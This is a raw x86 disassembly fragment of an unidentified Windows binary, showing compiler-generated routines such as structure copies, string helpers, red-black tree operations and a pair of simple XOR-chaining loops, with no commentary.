   12a5e:	lea    ecx,[esi+0x1c]
   12a61:	call   0x1299c
   12a66:	lea    eax,[edi+0x24]
   12a69:	push   eax
   12a6a:	lea    ecx,[esi+0x24]
   12a6d:	call   0x1299c
   12a72:	mov    eax,DWORD PTR [edi+0x2c]
   12a75:	mov    DWORD PTR [esi+0x2c],eax
   12a78:	mov    eax,DWORD PTR [edi+0x30]
   12a7b:	mov    DWORD PTR [esi+0x30],eax
   12a7e:	mov    eax,DWORD PTR [edi+0x38]
   12a81:	mov    DWORD PTR [esi+0x38],eax
   12a84:	mov    eax,DWORD PTR [edi+0x3c]
   12a87:	mov    DWORD PTR [esi+0x3c],eax
   12a8a:	mov    eax,DWORD PTR [edi+0x40]
   12a8d:	mov    DWORD PTR [esi+0x40],eax
   12a90:	mov    eax,DWORD PTR [edi+0x44]
   12a93:	add    edi,0x48
   12a96:	push   edi
   12a97:	lea    ecx,[esi+0x48]
   12a9a:	mov    DWORD PTR [esi+0x44],eax
   12a9d:	call   0x1299c
   12aa2:	pop    edi
   12aa3:	mov    eax,esi
   12aa5:	pop    esi
   12aa6:	pop    ebp
   12aa7:	ret    0x4
   12aaa:	int3   
   12aab:	int3   
   12aac:	int3   
   12aad:	int3   
   12aae:	int3   
   12aaf:	int3   
   12ab0:	mov    edi,edi
   12ab2:	push   esi
   12ab3:	mov    esi,ecx
   12ab5:	lea    ecx,[esi+0x8]
   12ab8:	call   0x11e9e
   12abd:	push   DWORD PTR [esi]
   12abf:	call   0x1d9f8
   12ac4:	pop    ecx
   12ac5:	pop    esi
   12ac6:	ret    
   12ac7:	int3   
   12ac8:	int3   
   12ac9:	int3   
   12aca:	int3   
   12acb:	int3   
   12acc:	mov    edi,edi
   12ace:	push   ebp
   12acf:	mov    ebp,esp
   12ad1:	push   esi
   12ad2:	push   DWORD PTR [ebp+0xc]
   12ad5:	mov    esi,ecx
   12ad7:	push   DWORD PTR [ebp+0x8]
   12ada:	call   0x1113e
   12adf:	mov    eax,esi
   12ae1:	pop    esi
   12ae2:	pop    ebp
   12ae3:	ret    0x8
   12ae6:	int3   
   12ae7:	int3   
   12ae8:	int3   
   12ae9:	int3   
   12aea:	int3   
   12aeb:	int3   
   12aec:	mov    edi,edi
   12aee:	push   ebp
   12aef:	mov    ebp,esp
   12af1:	mov    eax,DWORD PTR [ebp+0x8]
   12af4:	push   esi
   12af5:	push   DWORD PTR [eax+0x4]
   12af8:	mov    esi,ecx
   12afa:	push   DWORD PTR [eax]
   12afc:	call   0x1113e
   12b01:	mov    eax,esi
   12b03:	pop    esi
   12b04:	pop    ebp
   12b05:	ret    0x4
   12b08:	int3   
   12b09:	int3   
   12b0a:	int3   
   12b0b:	int3   
   12b0c:	int3   
   12b0d:	int3   
   12b0e:	mov    edi,edi
   12b10:	push   ebp
   12b11:	mov    ebp,esp
   12b13:	push   ebx
   12b14:	push   esi
   12b15:	push   edi
   12b16:	mov    edi,DWORD PTR [ebp+0x8]
   12b19:	mov    eax,DWORD PTR [edi+0x4]
   12b1c:	mov    esi,ecx
   12b1e:	mov    ebx,DWORD PTR [esi]
   12b20:	mov    DWORD PTR [esi+0x4],eax
   12b23:	xor    ecx,ecx
   12b25:	push   0x2
   12b27:	inc    eax
   12b28:	pop    edx
   12b29:	mul    edx
   12b2b:	seto   cl
   12b2e:	neg    ecx
   12b30:	or     ecx,eax
   12b32:	push   ecx
   12b33:	call   0x10a52
   12b38:	mov    ecx,DWORD PTR [esi+0x4]
   12b3b:	add    ecx,ecx
   12b3d:	push   ecx
   12b3e:	mov    DWORD PTR [esi],eax
   12b40:	push   DWORD PTR [edi]
   12b42:	push   eax
   12b43:	call   0x1da7a
   12b48:	mov    eax,DWORD PTR [esi+0x4]
   12b4b:	mov    ecx,DWORD PTR [esi]
   12b4d:	xor    edx,edx
   12b4f:	push   ebx
   12b50:	mov    WORD PTR [ecx+eax*2],dx
   12b54:	call   0x1d9f8
   12b59:	add    esp,0x14
   12b5c:	pop    edi
   12b5d:	mov    eax,esi
   12b5f:	pop    esi
   12b60:	pop    ebx
   12b61:	pop    ebp
   12b62:	ret    0x4
   12b65:	int3   
   12b66:	int3   
   12b67:	int3   
   12b68:	int3   
   12b69:	int3   
   12b6a:	mov    edi,edi
   12b6c:	push   ebp
   12b6d:	mov    ebp,esp
   12b6f:	push   esi
   12b70:	mov    esi,DWORD PTR [ebp+0x8]
   12b73:	lea    eax,[ebp+0xc]
   12b76:	push   eax
   12b77:	mov    ecx,esi
   12b79:	call   0x12aec
   12b7e:	xor    ecx,ecx
   12b80:	inc    ecx
   12b81:	cmp    DWORD PTR [esi+0x4],ecx
   12b84:	jbe    0x12b98
   12b86:	mov    eax,DWORD PTR [esi]
   12b88:	lea    eax,[eax+ecx*2]
   12b8b:	mov    dx,WORD PTR [eax-0x2]
   12b8f:	xor    WORD PTR [eax],dx
   12b92:	inc    ecx
   12b93:	cmp    ecx,DWORD PTR [esi+0x4]
   12b96:	jb     0x12b86
   12b98:	push   DWORD PTR [ebp+0xc]
   12b9b:	call   0x1d9f8
   12ba0:	pop    ecx
   12ba1:	mov    eax,esi
   12ba3:	pop    esi
   12ba4:	pop    ebp
   12ba5:	ret    0xc
   12ba8:	int3   
   12ba9:	int3   
   12baa:	int3   
   12bab:	int3   
   12bac:	int3   
   12bad:	int3   
   12bae:	mov    edi,edi
   12bb0:	push   ebp
   12bb1:	mov    ebp,esp
   12bb3:	push   esi
   12bb4:	mov    esi,DWORD PTR [ebp+0x8]
   12bb7:	lea    eax,[ebp+0xc]
   12bba:	push   eax
   12bbb:	mov    ecx,esi
   12bbd:	call   0x1297a
   12bc2:	xor    ecx,ecx
   12bc4:	inc    ecx
   12bc5:	cmp    DWORD PTR [esi+0x4],ecx
   12bc8:	jbe    0x12bd9
   12bca:	mov    eax,DWORD PTR [esi]
   12bcc:	add    eax,ecx
   12bce:	mov    dl,BYTE PTR [eax-0x1]
   12bd1:	xor    BYTE PTR [eax],dl
   12bd3:	inc    ecx
   12bd4:	cmp    ecx,DWORD PTR [esi+0x4]
   12bd7:	jb     0x12bca
   12bd9:	push   DWORD PTR [ebp+0xc]
   12bdc:	call   0x1d9f8
   12be1:	pop    ecx
   12be2:	mov    eax,esi
   12be4:	pop    esi
   12be5:	pop    ebp
   12be6:	ret    0xc
   12be9:	int3   
   12bea:	int3   
   12beb:	int3   
   12bec:	int3   
   12bed:	int3   
   12bee:	mov    edi,edi
   12bf0:	push   ebp
   12bf1:	mov    ebp,esp
   12bf3:	mov    eax,DWORD PTR [ebp+0x8]
   12bf6:	mov    eax,DWORD PTR [eax]
   12bf8:	push   esi
   12bf9:	push   DWORD PTR [ebp+0xc]
   12bfc:	mov    esi,ecx
   12bfe:	lea    ecx,[esi+0x4]
   12c01:	mov    DWORD PTR [esi],eax
   12c03:	call   0x11edc
   12c08:	mov    eax,esi
   12c0a:	pop    esi
   12c0b:	pop    ebp
   12c0c:	ret    0x8
   12c0f:	int3   
   12c10:	int3   
   12c11:	int3   
   12c12:	int3   
   12c13:	int3   
   12c14:	mov    edi,edi
   12c16:	push   ebp
   12c17:	mov    ebp,esp
   12c19:	push   esi
   12c1a:	push   edi
   12c1b:	mov    edi,DWORD PTR [ebp+0x8]
   12c1e:	push   edi
   12c1f:	mov    esi,ecx
   12c21:	call   0x1297a
   12c26:	lea    eax,[edi+0x8]
   12c29:	push   eax
   12c2a:	lea    ecx,[esi+0x8]
   12c2d:	call   0x1297a
   12c32:	mov    eax,DWORD PTR [edi+0x10]
   12c35:	mov    DWORD PTR [esi+0x10],eax
   12c38:	lea    eax,[edi+0x14]
   12c3b:	push   eax
   12c3c:	lea    ecx,[esi+0x14]
   12c3f:	call   0x1297a
   12c44:	lea    eax,[edi+0x1c]
   12c47:	push   eax
   12c48:	lea    ecx,[esi+0x1c]
   12c4b:	call   0x1297a
   12c50:	lea    eax,[edi+0x24]
   12c53:	push   eax
   12c54:	lea    ecx,[esi+0x24]
   12c57:	call   0x1297a
   12c5c:	mov    eax,DWORD PTR [edi+0x2c]
   12c5f:	mov    DWORD PTR [esi+0x2c],eax
   12c62:	mov    eax,DWORD PTR [edi+0x30]
   12c65:	mov    DWORD PTR [esi+0x30],eax
   12c68:	mov    eax,DWORD PTR [edi+0x38]
   12c6b:	mov    DWORD PTR [esi+0x38],eax
   12c6e:	mov    eax,DWORD PTR [edi+0x3c]
   12c71:	mov    DWORD PTR [esi+0x3c],eax
   12c74:	mov    eax,DWORD PTR [edi+0x40]
   12c77:	mov    DWORD PTR [esi+0x40],eax
   12c7a:	mov    eax,DWORD PTR [edi+0x44]
   12c7d:	add    edi,0x48
   12c80:	push   edi
   12c81:	lea    ecx,[esi+0x48]
   12c84:	mov    DWORD PTR [esi+0x44],eax
   12c87:	call   0x1297a
   12c8c:	pop    edi
   12c8d:	mov    eax,esi
   12c8f:	pop    esi
   12c90:	pop    ebp
   12c91:	ret    0x4
   12c94:	int3   
   12c95:	int3   
   12c96:	int3   
   12c97:	int3   
   12c98:	int3   
   12c99:	int3   
   12c9a:	mov    edi,edi
   12c9c:	push   ebp
   12c9d:	mov    ebp,esp
   12c9f:	mov    eax,DWORD PTR [ebp+0x8]
   12ca2:	mov    edx,DWORD PTR ds:0x7f8c4
   12ca8:	jmp    0x12cac
   12caa:	mov    eax,ecx
   12cac:	mov    ecx,DWORD PTR [eax]
   12cae:	cmp    ecx,edx
   12cb0:	jne    0x12caa
   12cb2:	pop    ebp
   12cb3:	ret    0x4
   12cb6:	int3   
   12cb7:	int3   
   12cb8:	int3   
   12cb9:	int3   
   12cba:	int3   
   12cbb:	int3   
   12cbc:	mov    edi,edi
   12cbe:	push   ebp
   12cbf:	mov    ebp,esp
   12cc1:	mov    eax,DWORD PTR [ecx+0x4]
   12cc4:	mov    ecx,DWORD PTR [eax+0x4]
   12cc7:	mov    edx,DWORD PTR ds:0x7f8b8
   12ccd:	cmp    ecx,edx
   12ccf:	je     0x12cea
   12cd1:	push   esi
   12cd2:	mov    esi,DWORD PTR [ebp+0x8]
   12cd5:	mov    esi,DWORD PTR [esi]
   12cd7:	cmp    DWORD PTR [ecx+0xc],esi
   12cda:	jae    0x12ce1
   12cdc:	mov    ecx,DWORD PTR [ecx+0x8]
   12cdf:	jmp    0x12ce5
   12ce1:	mov    eax,ecx
   12ce3:	mov    ecx,DWORD PTR [ecx]
   12ce5:	cmp    ecx,edx
   12ce7:	jne    0x12cd7
   12ce9:	pop    esi
   12cea:	pop    ebp
   12ceb:	ret    0x4
   12cee:	int3   
   12cef:	int3   
   12cf0:	int3   
   12cf1:	int3   
   12cf2:	int3   
   12cf3:	int3   
   12cf4:	mov    edi,edi
   12cf6:	push   ebp
   12cf7:	mov    ebp,esp
   12cf9:	mov    edx,DWORD PTR [ebp+0x8]
   12cfc:	mov    eax,DWORD PTR [edx+0x8]
   12cff:	push   esi
   12d00:	mov    esi,DWORD PTR [eax]
   12d02:	mov    DWORD PTR [edx+0x8],esi
   12d05:	mov    esi,DWORD PTR [eax]
   12d07:	cmp    esi,DWORD PTR ds:0x7f8b8
   12d0d:	je     0x12d12
   12d0f:	mov    DWORD PTR [esi+0x4],edx
   12d12:	mov    esi,DWORD PTR [edx+0x4]
   12d15:	mov    DWORD PTR [eax+0x4],esi
   12d18:	mov    ecx,DWORD PTR [ecx+0x4]
   12d1b:	pop    esi
   12d1c:	cmp    edx,DWORD PTR [ecx+0x4]
   12d1f:	jne    0x12d26
   12d21:	mov    DWORD PTR [ecx+0x4],eax
   12d24:	jmp    0x12d34
   12d26:	mov    ecx,DWORD PTR [edx+0x4]
   12d29:	cmp    edx,DWORD PTR [ecx]
   12d2b:	jne    0x12d31
   12d2d:	mov    DWORD PTR [ecx],eax
   12d2f:	jmp    0x12d34
   12d31:	mov    DWORD PTR [ecx+0x8],eax
   12d34:	mov    DWORD PTR [eax],edx
   12d36:	mov    DWORD PTR [edx+0x4],eax
   12d39:	pop    ebp
   12d3a:	ret    0x4
   12d3d:	int3   
   12d3e:	int3   
   12d3f:	int3   
   12d40:	int3   
   12d41:	int3   
   12d42:	mov    edi,edi
   12d44:	push   ebp
   12d45:	mov    ebp,esp
   12d47:	mov    edx,DWORD PTR [ebp+0x8]
   12d4a:	mov    eax,DWORD PTR [edx]
   12d4c:	push   esi
   12d4d:	mov    esi,DWORD PTR [eax+0x8]
   12d50:	mov    DWORD PTR [edx],esi
   12d52:	mov    esi,DWORD PTR [eax+0x8]
   12d55:	cmp    esi,DWORD PTR ds:0x7f8b8
   12d5b:	je     0x12d60
   12d5d:	mov    DWORD PTR [esi+0x4],edx
   12d60:	mov    esi,DWORD PTR [edx+0x4]
   12d63:	mov    DWORD PTR [eax+0x4],esi
   12d66:	mov    ecx,DWORD PTR [ecx+0x4]
   12d69:	pop    esi
   12d6a:	cmp    edx,DWORD PTR [ecx+0x4]
   12d6d:	jne    0x12d74
   12d6f:	mov    DWORD PTR [ecx+0x4],eax
   12d72:	jmp    0x12d83
   12d74:	mov    ecx,DWORD PTR [edx+0x4]
   12d77:	cmp    edx,DWORD PTR [ecx+0x8]
   12d7a:	jne    0x12d81
   12d7c:	mov    DWORD PTR [ecx+0x8],eax
   12d7f:	jmp    0x12d83
   12d81:	mov    DWORD PTR [ecx],eax
   12d83:	mov    DWORD PTR [eax+0x8],edx
   12d86:	mov    DWORD PTR [edx+0x4],eax
   12d89:	pop    ebp
   12d8a:	ret    0x4
   12d8d:	int3   
   12d8e:	int3   
   12d8f:	int3   
   12d90:	int3   
   12d91:	int3   
   12d92:	mov    edi,edi
   12d94:	push   ebp
   12d95:	mov    ebp,esp
   12d97:	mov    eax,DWORD PTR [ecx+0x4]
   12d9a:	push   esi
   12d9b:	mov    esi,DWORD PTR [eax+0x4]
   12d9e:	push   edi
   12d9f:	mov    edi,eax
   12da1:	jmp    0x12dbc
   12da3:	push   DWORD PTR [ebp+0x8]
   12da6:	lea    eax,[esi+0x10]
   12da9:	push   eax
   12daa:	call   0x19790
   12daf:	test   al,al
   12db1:	je     0x12db8
   12db3:	mov    esi,DWORD PTR [esi+0x8]
   12db6:	jmp    0x12dbc
   12db8:	mov    edi,esi
   12dba:	mov    esi,DWORD PTR [esi]
   12dbc:	cmp    esi,DWORD PTR ds:0x7f8c4
   12dc2:	jne    0x12da3
   12dc4:	mov    eax,edi
   12dc6:	pop    edi
   12dc7:	pop    esi
   12dc8:	pop    ebp
   12dc9:	ret    0x4
   12dcc:	int3   
   12dcd:	int3   
   12dce:	int3   
   12dcf:	int3   
   12dd0:	int3   
   12dd1:	int3   
   12dd2:	mov    edi,edi
   12dd4:	push   ebp
   12dd5:	mov    ebp,esp
   12dd7:	mov    eax,DWORD PTR [ecx+0x4]
   12dda:	push   esi
   12ddb:	mov    esi,DWORD PTR [eax+0x4]
   12dde:	push   edi
   12ddf:	mov    edi,eax
   12de1:	jmp    0x12dfc
   12de3:	push   DWORD PTR [ebp+0x8]
   12de6:	lea    eax,[esi+0xc]
   12de9:	push   eax
   12dea:	call   0x19790
   12def:	test   al,al
   12df1:	je     0x12df8
   12df3:	mov    esi,DWORD PTR [esi+0x8]
   12df6:	jmp    0x12dfc
   12df8:	mov    edi,esi
   12dfa:	mov    esi,DWORD PTR [esi]
   12dfc:	cmp    esi,DWORD PTR ds:0x7f8c8
   12e02:	jne    0x12de3
   12e04:	mov    eax,edi
   12e06:	pop    edi
   12e07:	pop    esi
   12e08:	pop    ebp
   12e09:	ret    0x4
   12e0c:	int3   
   12e0d:	int3   
   12e0e:	int3   
   12e0f:	int3   
   12e10:	int3   
   12e11:	int3   
   12e12:	mov    edi,edi
   12e14:	push   ebp
   12e15:	mov    ebp,esp
   12e17:	mov    eax,DWORD PTR [ecx+0x4]
   12e1a:	mov    ecx,DWORD PTR [eax+0x4]
   12e1d:	mov    edx,DWORD PTR ds:0x7f8cc
   12e23:	cmp    ecx,edx
   12e25:	je     0x12e40
   12e27:	push   esi
   12e28:	mov    esi,DWORD PTR [ebp+0x8]
   12e2b:	mov    esi,DWORD PTR [esi]
   12e2d:	cmp    DWORD PTR [ecx+0xc],esi
   12e30:	jge    0x12e37
   12e32:	mov    ecx,DWORD PTR [ecx+0x8]
   12e35:	jmp    0x12e3b
   12e37:	mov    eax,ecx
   12e39:	mov    ecx,DWORD PTR [ecx]
   12e3b:	cmp    ecx,edx
   12e3d:	jne    0x12e2d
   12e3f:	pop    esi
   12e40:	pop    ebp
   12e41:	ret    0x4
   12e44:	int3   
   12e45:	int3   
   12e46:	int3   
   12e47:	int3   
   12e48:	int3   
   12e49:	int3   
   12e4a:	mov    edi,edi
   12e4c:	push   esi
   12e4d:	mov    esi,ecx
   12e4f:	mov    ecx,DWORD PTR [esi]
   12e51:	mov    eax,DWORD PTR [ecx+0x8]
   12e54:	cmp    eax,DWORD PTR ds:0x7f8c0
   12e5a:	je     0x12e68
   12e5c:	push   eax
   12e5d:	call   0x11254
   12e62:	jmp    0x12e77
   12e64:	mov    DWORD PTR [esi],eax
   12e66:	mov    ecx,eax
   12e68:	mov    eax,DWORD PTR [ecx+0x4]
   12e6b:	cmp    ecx,DWORD PTR [eax+0x8]
   12e6e:	je     0x12e64
   12e70:	mov    ecx,DWORD PTR [esi]
   12e72:	cmp    DWORD PTR [ecx+0x8],eax
   12e75:	je     0x12e79
   12e77:	mov    DWORD PTR [esi],eax
   12e79:	pop    esi
   12e7a:	ret    
   12e7b:	int3   
   12e7c:	int3   
   12e7d:	int3   
   12e7e:	int3   
   12e7f:	int3   
   12e80:	mov    edi,edi
   12e82:	push   esi
   12e83:	mov    esi,ecx
   12e85:	mov    ecx,DWORD PTR [esi]
   12e87:	cmp    DWORD PTR [ecx+0x10],0x0
   12e8b:	jne    0x12e9a
   12e8d:	mov    eax,DWORD PTR [ecx+0x4]
   12e90:	cmp    DWORD PTR [eax+0x4],ecx
   12e93:	jne    0x12e9a
   12e95:	mov    eax,DWORD PTR [ecx+0x8]
   12e98:	jmp    0x12eb7
   12e9a:	mov    eax,DWORD PTR [ecx]
   12e9c:	cmp    eax,DWORD PTR ds:0x7f8bc
   12ea2:	je     0x12eb0
   12ea4:	push   eax
   12ea5:	call   0x111ee
   12eaa:	jmp    0x12eb7
   12eac:	mov    DWORD PTR [esi],eax
   12eae:	mov    ecx,eax
   12eb0:	mov    eax,DWORD PTR [ecx+0x4]
   12eb3:	cmp    ecx,DWORD PTR [eax]
   12eb5:	je     0x12eac
   12eb7:	mov    DWORD PTR [esi],eax
   12eb9:	pop    esi
   12eba:	ret    
   12ebb:	int3   
   12ebc:	int3   
   12ebd:	int3   
   12ebe:	int3   
   12ebf:	int3   
   12ec0:	mov    edi,edi
   12ec2:	push   esi
   12ec3:	mov    esi,ecx
   12ec5:	mov    ecx,DWORD PTR [esi]
   12ec7:	mov    eax,DWORD PTR [ecx+0x8]
   12eca:	cmp    eax,DWORD PTR ds:0x7f8bc
   12ed0:	je     0x12ede
   12ed2:	push   eax
   12ed3:	call   0x11210
   12ed8:	jmp    0x12eed
   12eda:	mov    DWORD PTR [esi],eax
   12edc:	mov    ecx,eax
   12ede:	mov    eax,DWORD PTR [ecx+0x4]
   12ee1:	cmp    ecx,DWORD PTR [eax+0x8]
   12ee4:	je     0x12eda
   12ee6:	mov    ecx,DWORD PTR [esi]
   12ee8:	cmp    DWORD PTR [ecx+0x8],eax
   12eeb:	je     0x12eef
   12eed:	mov    DWORD PTR [esi],eax
   12eef:	pop    esi
   12ef0:	ret    
   12ef1:	int3   
   12ef2:	int3   
   12ef3:	int3   
   12ef4:	int3   
   12ef5:	int3   
   12ef6:	mov    edi,edi
   12ef8:	push   ebp
   12ef9:	mov    ebp,esp
   12efb:	mov    edx,DWORD PTR [ebp+0x8]
   12efe:	mov    eax,DWORD PTR [edx+0x8]
   12f01:	push   esi
   12f02:	mov    esi,DWORD PTR [eax]
   12f04:	mov    DWORD PTR [edx+0x8],esi
   12f07:	mov    esi,DWORD PTR [eax]
   12f09:	cmp    esi,DWORD PTR ds:0x7f8bc
   12f0f:	je     0x12f14
   12f11:	mov    DWORD PTR [esi+0x4],edx
   12f14:	mov    esi,DWORD PTR [edx+0x4]
   12f17:	mov    DWORD PTR [eax+0x4],esi
   12f1a:	mov    ecx,DWORD PTR [ecx+0x4]
   12f1d:	pop    esi
   12f1e:	cmp    edx,DWORD PTR [ecx+0x4]
   12f21:	jne    0x12f28
   12f23:	mov    DWORD PTR [ecx+0x4],eax
   12f26:	jmp    0x12f36
   12f28:	mov    ecx,DWORD PTR [edx+0x4]
   12f2b:	cmp    edx,DWORD PTR [ecx]
   12f2d:	jne    0x12f33
   12f2f:	mov    DWORD PTR [ecx],eax
   12f31:	jmp    0x12f36
   12f33:	mov    DWORD PTR [ecx+0x8],eax
   12f36:	mov    DWORD PTR [eax],edx
   12f38:	mov    DWORD PTR [edx+0x4],eax
   12f3b:	pop    ebp
   12f3c:	ret    0x4
   12f3f:	int3   
   12f40:	int3   
   12f41:	int3   
   12f42:	int3   
   12f43:	int3   
   12f44:	mov    edi,edi
   12f46:	push   ebp
   12f47:	mov    ebp,esp
   12f49:	mov    edx,DWORD PTR [ebp+0x8]
   12f4c:	mov    eax,DWORD PTR [edx]
   12f4e:	push   esi
   12f4f:	mov    esi,DWORD PTR [eax+0x8]
   12f52:	mov    DWORD PTR [edx],esi
   12f54:	mov    esi,DWORD PTR [eax+0x8]
   12f57:	cmp    esi,DWORD PTR ds:0x7f8bc
   12f5d:	je     0x12f62
   12f5f:	mov    DWORD PTR [esi+0x4],edx
   12f62:	mov    esi,DWORD PTR [edx+0x4]
   12f65:	mov    DWORD PTR [eax+0x4],esi
   12f68:	mov    ecx,DWORD PTR [ecx+0x4]
   12f6b:	pop    esi
   12f6c:	cmp    edx,DWORD PTR [ecx+0x4]
   12f6f:	jne    0x12f76
   12f71:	mov    DWORD PTR [ecx+0x4],eax
   12f74:	jmp    0x12f85
   12f76:	mov    ecx,DWORD PTR [edx+0x4]
   12f79:	cmp    edx,DWORD PTR [ecx+0x8]
   12f7c:	jne    0x12f83
   12f7e:	mov    DWORD PTR [ecx+0x8],eax
   12f81:	jmp    0x12f85
   12f83:	mov    DWORD PTR [ecx],eax
   12f85:	mov    DWORD PTR [eax+0x8],edx
   12f88:	mov    DWORD PTR [edx+0x4],eax
   12f8b:	pop    ebp
   12f8c:	ret    0x4
   12f8f:	int3   
   12f90:	int3   
   12f91:	int3   
   12f92:	int3   
   12f93:	int3   
   12f94:	mov    edi,edi
   12f96:	push   ebp
   12f97:	mov    ebp,esp
   12f99:	mov    eax,DWORD PTR [ecx+0x4]
   12f9c:	push   esi
   12f9d:	mov    esi,DWORD PTR [eax+0x4]
   12fa0:	push   edi
   12fa1:	mov    edi,eax
   12fa3:	jmp    0x12fbe
   12fa5:	push   DWORD PTR [ebp+0x8]
   12fa8:	lea    eax,[esi+0x10]
   12fab:	push   eax
   12fac:	call   0x19790
   12fb1:	test   al,al
   12fb3:	je     0x12fba
   12fb5:	mov    esi,DWORD PTR [esi+0x8]
   12fb8:	jmp    0x12fbe
   12fba:	mov    edi,esi
   12fbc:	mov    esi,DWORD PTR [esi]
   12fbe:	cmp    esi,DWORD PTR ds:0x7f8c0
   12fc4:	jne    0x12fa5
   12fc6:	mov    eax,edi
   12fc8:	pop    edi
   12fc9:	pop    esi
   12fca:	pop    ebp
   12fcb:	ret    0x4
   12fce:	int3   
   12fcf:	int3   
   12fd0:	int3   
   12fd1:	int3   
   12fd2:	int3   
   12fd3:	int3   
   12fd4:	mov    edi,edi
   12fd6:	push   ebp
   12fd7:	mov    ebp,esp
   12fd9:	mov    edx,DWORD PTR [ebp+0x8]
   12fdc:	mov    eax,DWORD PTR [edx+0x8]
   12fdf:	push   esi
   12fe0:	mov    esi,DWORD PTR [eax]
   12fe2:	mov    DWORD PTR [edx+0x8],esi
   12fe5:	mov    esi,DWORD PTR [eax]
   12fe7:	cmp    esi,DWORD PTR ds:0x7f8c0
   12fed:	je     0x12ff2
   12fef:	mov    DWORD PTR [esi+0x4],edx
   12ff2:	mov    esi,DWORD PTR [edx+0x4]
   12ff5:	mov    DWORD PTR [eax+0x4],esi
   12ff8:	mov    ecx,DWORD PTR [ecx+0x4]
   12ffb:	pop    esi
   12ffc:	cmp    edx,DWORD PTR [ecx+0x4]
   12fff:	jne    0x13006
   13001:	mov    DWORD PTR [ecx+0x4],eax
   13004:	jmp    0x13014
   13006:	mov    ecx,DWORD PTR [edx+0x4]
   13009:	cmp    edx,DWORD PTR [ecx]
   1300b:	jne    0x13011
   1300d:	mov    DWORD PTR [ecx],eax
   1300f:	jmp    0x13014
   13011:	mov    DWORD PTR [ecx+0x8],eax
   13014:	mov    DWORD PTR [eax],edx
   13016:	mov    DWORD PTR [edx+0x4],eax
   13019:	pop    ebp
   1301a:	ret    0x4
   1301d:	int3   
   1301e:	int3   
   1301f:	int3   
   13020:	int3   
   13021:	int3   
   13022:	mov    edi,edi
   13024:	push   ebp
   13025:	mov    ebp,esp
   13027:	mov    edx,DWORD PTR [ebp+0x8]
   1302a:	mov    eax,DWORD PTR [edx]
   1302c:	push   esi
   1302d:	mov    esi,DWORD PTR [eax+0x8]
   13030:	mov    DWORD PTR [edx],esi
   13032:	mov    esi,DWORD PTR [eax+0x8]
   13035:	cmp    esi,DWORD PTR ds:0x7f8c0
   1303b:	je     0x13040
   1303d:	mov    DWORD PTR [esi+0x4],edx
   13040:	mov    esi,DWORD PTR [edx+0x4]
   13043:	mov    DWORD PTR [eax+0x4],esi
   13046:	mov    ecx,DWORD PTR [ecx+0x4]
   13049:	pop    esi
   1304a:	cmp    edx,DWORD PTR [ecx+0x4]
   1304d:	jne    0x13054
   1304f:	mov    DWORD PTR [ecx+0x4],eax
   13052:	jmp    0x13063
   13054:	mov    ecx,DWORD PTR [edx+0x4]
   13057:	cmp    edx,DWORD PTR [ecx+0x8]
   1305a:	jne    0x13061
   1305c:	mov    DWORD PTR [ecx+0x8],eax
   1305f:	jmp    0x13063
   13061:	mov    DWORD PTR [ecx],eax
   13063:	mov    DWORD PTR [eax+0x8],edx
   13066:	mov    DWORD PTR [edx+0x4],eax
   13069:	pop    ebp
   1306a:	ret    0x4
   1306d:	int3   
   1306e:	int3   
   1306f:	int3   
   13070:	int3   
   13071:	int3   
   13072:	mov    edi,edi
   13074:	push   ebp
   13075:	mov    ebp,esp
   13077:	mov    eax,DWORD PTR [ecx+0x4]
   1307a:	mov    ecx,DWORD PTR [eax+0x4]
   1307d:	mov    edx,DWORD PTR ds:0x7f8b8
   13083:	cmp    ecx,edx
   13085:	je     0x130a0
   13087:	push   esi
   13088:	mov    esi,DWORD PTR [ebp+0x8]
   1308b:	mov    esi,DWORD PTR [esi]
   1308d:	cmp    esi,DWORD PTR [ecx+0xc]
   13090:	jae    0x13098
   13092:	mov    eax,ecx
   13094:	mov    ecx,DWORD PTR [ecx]
   13096:	jmp    0x1309b
   13098:	mov    ecx,DWORD PTR [ecx+0x8]
   1309b:	cmp    ecx,edx
   1309d:	jne    0x1308d
   1309f:	pop    esi
   130a0:	pop    ebp
   130a1:	ret    0x4
   130a4:	int3   
   130a5:	int3   
   130a6:	int3   
   130a7:	int3   
   130a8:	int3   
   130a9:	int3   
   130aa:	mov    edi,edi
   130ac:	push   ebp
   130ad:	mov    ebp,esp
   130af:	mov    eax,DWORD PTR [ecx+0x4]
   130b2:	push   esi
   130b3:	mov    esi,DWORD PTR [eax+0x4]
   130b6:	push   edi
   130b7:	mov    edi,eax
   130b9:	jmp    0x130d4
   130bb:	lea    eax,[esi+0x10]
   130be:	push   eax
   130bf:	push   DWORD PTR [ebp+0x8]
   130c2:	call   0x19790
   130c7:	test   al,al
   130c9:	je     0x130d1
   130cb:	mov    edi,esi
   130cd:	mov    esi,DWORD PTR [esi]
   130cf:	jmp    0x130d4
   130d1:	mov    esi,DWORD PTR [esi+0x8]
   130d4:	cmp    esi,DWORD PTR ds:0x7f8c4
   130da:	jne    0x130bb
   130dc:	mov    eax,edi
   130de:	pop    edi
   130df:	pop    esi
   130e0:	pop    ebp
   130e1:	ret    0x4
   130e4:	int3   
   130e5:	int3   
   130e6:	int3   
   130e7:	int3   
   130e8:	int3   
   130e9:	int3   
   130ea:	mov    edi,edi
   130ec:	push   ebp
   130ed:	mov    ebp,esp
   130ef:	mov    edx,DWORD PTR [ebp+0x8]
   130f2:	mov    eax,DWORD PTR [edx+0x8]
   130f5:	push   esi
   130f6:	mov    esi,DWORD PTR [eax]
   130f8:	mov    DWORD PTR [edx+0x8],esi
   130fb:	mov    esi,DWORD PTR [eax]
   130fd:	cmp    esi,DWORD PTR ds:0x7f8c8
   13103:	je     0x13108
   13105:	mov    DWORD PTR [esi+0x4],edx
   13108:	mov    esi,DWORD PTR [edx+0x4]
   1310b:	mov    DWORD PTR [eax+0x4],esi
   1310e:	mov    ecx,DWORD PTR [ecx+0x4]
   13111:	pop    esi
   13112:	cmp    edx,DWORD PTR [ecx+0x4]
   13115:	jne    0x1311c
   13117:	mov    DWORD PTR [ecx+0x4],eax
   1311a:	jmp    0x1312a
   1311c:	mov    ecx,DWORD PTR [edx+0x4]
   1311f:	cmp    edx,DWORD PTR [ecx]
   13121:	jne    0x13127
   13123:	mov    DWORD PTR [ecx],eax
   13125:	jmp    0x1312a
   13127:	mov    DWORD PTR [ecx+0x8],eax
   1312a:	mov    DWORD PTR [eax],edx
   1312c:	mov    DWORD PTR [edx+0x4],eax
   1312f:	pop    ebp
   13130:	ret    0x4
   13133:	int3   
   13134:	int3   
   13135:	int3   
   13136:	int3   
   13137:	int3   
   13138:	mov    edi,edi
   1313a:	push   ebp
   1313b:	mov    ebp,esp
   1313d:	mov    edx,DWORD PTR [ebp+0x8]
   13140:	mov    eax,DWORD PTR [edx]
